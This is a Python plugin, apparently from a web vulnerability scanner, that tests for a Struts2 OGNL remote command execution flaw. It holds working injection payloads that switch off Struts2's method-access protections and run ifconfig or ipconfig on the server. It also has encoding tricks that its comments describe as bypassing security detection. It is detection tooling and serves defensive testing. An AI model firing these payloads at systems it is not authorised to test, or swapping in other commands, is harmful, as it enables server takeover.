#!/usr/bin/python
# -*- coding: utf-8 -*-

from urllib import quote
from engine.engine_utils.common import *
from urlparse import urlparse
from engine.logger import scanLogger as logger


def run_url(http,ob,item):
    result = []
    try:
        result = []
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        url = item['url']
        url = url.split('?')[0]
        params = item['params']
        url_parse = urlparse(url)
        scheme = url_parse.scheme
        domain = url_parse.netloc
        path = url_parse.path
        query = url_parse.query

        if source_ip:
            domain = source_ip
        if query:
            url = "%s://%s%s?%s" % (scheme, domain, path, query)
        else:
            url = "%s://%s%s" % (scheme, domain, path)
        if not re.search(r'(?:\.action|\.do)', url):
            return []
        inj_key = re.search(r'\b.*?name\b', params, re.I).group()
        if not inj_key:
            return []

        # 原始恶意请求，在发送请求之前会做urlencode
        unix_list = [
            # 执行命令 ifconfig,并将结果回显；检测关键字 HWaddr|inet addr
            """(#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false),
             #_memberAccess["allowStaticMethodAccess"]=true, #a=@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream(),
            #b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),
            #kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kxlzx.println(#d),#kxlzx.close())(meh)&z[(name)('meh')]""",
        ]

        win_list = [
            # 执行命令 ipconfig，并将结果回显；检测关键字 IPv4|IPv6|DNS
            """(#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false),
             #_memberAccess["allowStaticMethodAccess"]=true, #a=@java.lang.Runtime@getRuntime().exec('ipconfig').getInputStream(),
            #b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),
            #kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kxlzx.println(#d),#kxlzx.close())(meh)&z[(name)('meh')]"""
        ]

        # 未知操作系统
        os = ob.get('os')
        list1 = []
        if os == 'unknown':
            list1 = win_list + unix_list
        # 已知操作系统
        if 'windows' == os:
            list1 += win_list
        if 'linux' == os:
            list1 += unix_list

        # 转换#绕过安全检测 urlencode最后会做，这里不对#做urlencode
        list2 = []
        for value in list1:
            for tamper in ['\u0023','\43']:
                new_value = value.replace("#", tamper)
                list2.append(new_value)

        # 转换空格满足ongl语法限制 urlencode最后会做，这里不对空格做urlencode
        list3 = []
        for value in list2:
            for tamper in ['+', '\40']:
                new_value = value.replace(" ", tamper)
                list3.append(new_value)

        inj_value_list = list1 + list2 + list3
        for inj_value in inj_value_list:
            inj_value = quote(inj_value, safe="()=.")
            new_url = url + '?' + inj_key + '=' + inj_value
            res, content = http.request(new_url, 'GET', headers=header)
            if res and res.get('status') == '200':
                request = getRequest(new_url, headers=header, domain=ob['domain'])
                # response = getResponse(res,content)
                if re.search(r'(?:HWaddr|inet addr)', content):
                    detail = "检测到Struts2远程命令执行漏洞"
                    if not ob.get('os') or ob.get('os') == 'unknown':
                        ob['os'] = 'linux'
                    response = getResponse(res, content, '(?:HWaddr|inet addr)')
                    result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
                    break
                if re.search(r'(?:IPv4|IPv6|DNS)', content):
                    detail = "检测到Struts2远程命令执行漏洞"
                    if not ob.get('os') or ob.get('os') == 'unknown':
                        ob['os'] = 'windows'
                    response = getResponse(res, content, '(?:IPv4|IPv6|DNS)')
                    result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
                    break

    except Exception, e:
        logger.error("File:Struts2_s2_008NameScript_yd.py, run_domain function :%s" % (str(e)))

    return result



